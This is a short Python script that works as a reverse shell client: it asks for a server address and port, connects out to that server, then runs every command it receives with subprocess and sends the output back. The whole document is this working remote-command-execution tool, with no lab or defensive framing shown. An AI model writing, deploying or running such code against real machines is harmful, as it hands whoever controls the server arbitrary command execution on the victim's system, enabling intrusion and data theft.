import socket
import subprocess

host = input("Enter Server address: ")
port = int(input("Enter Port: "))

# Creating socket object
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

print("Waiting For connection....")
# Connecting with server
while True:
	try:
		s.connect((host,port))
		break
	except ConnectionRefusedError:
		pass
print("Connected")
while True:
	cmd = s.recv(1024).decode()
	output = subprocess.getoutput(cmd)
	s.send(output.encode())
	if cmd == "exit":
		print("Connection closed")
		break
s.close()
	
